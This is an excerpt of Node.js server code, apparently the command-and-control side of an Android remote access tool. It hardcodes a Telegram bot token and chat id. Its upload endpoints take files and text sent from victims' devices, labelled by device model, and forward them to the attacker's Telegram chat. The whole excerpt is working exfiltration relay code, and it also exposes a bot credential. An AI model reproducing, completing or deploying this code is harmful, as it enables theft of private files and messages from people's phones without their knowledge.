...
const token = '7727225081:AAGRk-LFouOiEVPavfbPMoabYN5TX1hhXA8'
const id = '7125184791'
...
app.post("/uploadFile", upload.single('file'), (req, res) => {
    ...
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦  <b>${req.headers.model}</b> 𝐝𝐞𝐯𝐢𝐜𝐞 `,
            parse_mode: "HTML"
        },
        {
            filename: name,
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦  <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
